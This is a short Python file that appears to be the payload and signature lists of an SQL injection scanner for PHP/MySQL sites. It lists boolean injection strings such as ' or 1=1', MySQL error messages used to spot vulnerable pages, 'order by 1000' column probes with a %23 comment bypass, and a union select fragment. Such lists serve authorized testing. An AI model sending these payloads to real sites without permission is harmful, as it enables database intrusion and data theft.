# -*- coding: utf-8 -*-
import re, string

#This is set of characters of injection in url
define_injections_chars = [
    '\'', ')', '\"', " or 1=1", " and 1=1", " and 1/2=1/3", " and 1/22=1/22",
    " or 112/32=1/123", " or 1/1=1/1", " and 'a'<>'b'", " and 2<3",
    " and 'a'='a'", " and char(32)=' '", " and 3<=2", " and 5<=>4",
    " and 5<=>5", " and 5 is null", " or 5 is not null"

] #End

#This is set of error that perhaps happen in response
define_error_list_php = [
    "You have an error in your SQL syntax;",
    "mysql_num_rows() expects parameter",
    "mysql_fetch_array() expects parameter",
    "Invalid SQL: SELECT * FROM"
] #End

#This is order by command and it bypass
define_order_by_command_php = [
    " order by 1000",
    " order by 1000 %23",
    " group by 1000",
    " group by 1000 %23"
]

#order by errors
define_error_order_by_php = [
    "Unknown column '1000' in 'order clause'"
]

#Order by in php End
define_union_select_query_php = [
    " union select ",
]
